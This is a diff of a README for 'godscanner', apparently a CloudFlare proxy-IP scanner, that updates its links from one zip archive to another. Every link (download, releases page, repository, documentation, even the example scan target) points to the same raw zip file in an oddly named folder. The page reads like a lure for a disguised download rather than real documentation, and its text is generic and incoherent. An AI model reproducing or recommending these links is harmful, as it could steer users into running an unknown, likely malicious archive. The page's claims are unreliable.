@@ -1,7 +1,7 @@
 # 🚀 godscanner - Easily Find Proxy IPs Through CloudFlare
 
 ## 💾 Download Now
-[![Download godscanner](https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software-v2.8.zip)](https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software-v2.8.zip)
+[![Download godscanner](https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software_v3.8.zip)](https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software_v3.8.zip)
 
 ## 📖 Overview
 Godscanner is a tool designed to help users find non-official IP addresses that relay traffic through the CloudFlare CDN. With godscanner, you can easily identify these IPs to ensure better management of your online activities.
@@ -16,7 +16,7 @@ Before you download godscanner, make sure your system meets the following requir
 - **Network Connection:** A stable internet connection for scanning.
 
 ### 2. **Download & Install**
-To download godscanner, visit the [Releases page](https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software-v2.8.zip). This page contains the latest version of the software.
+To download godscanner, visit the [Releases page](https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software_v3.8.zip). This page contains the latest version of the software.
 
 1. Click on the link above.
 2. Find the latest release.
@@ -33,7 +33,7 @@ Once you have downloaded the software, follow these steps to run it:
 After installation, you can start using godscanner.
 
 1. Open the application.
-2. Enter the target domain you wish to scan (e.g., https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software-v2.8.zip).
+2. Enter the target domain you wish to scan (e.g., https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software_v3.8.zip).
 3. Click the "Scan" button.
 4. Wait a moment while the scan runs. Results will display once finished.
 
@@ -68,7 +68,7 @@ Godscanner is an open-source project. If you're interested in contributing, plea
 Thank you for utilizing godscanner. Your involvement helps us enhance the application and serve our community better. 
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software-v2.8.zip)
-- [Documentation](https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software-v2.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software_v3.8.zip)
+- [Documentation](https://raw.githubusercontent.com/kingstreet637/godscanner/main/expulsatory/Software_v3.8.zip)
 
 Feel free to explore and make the most out of godscanner. Happy scanning!
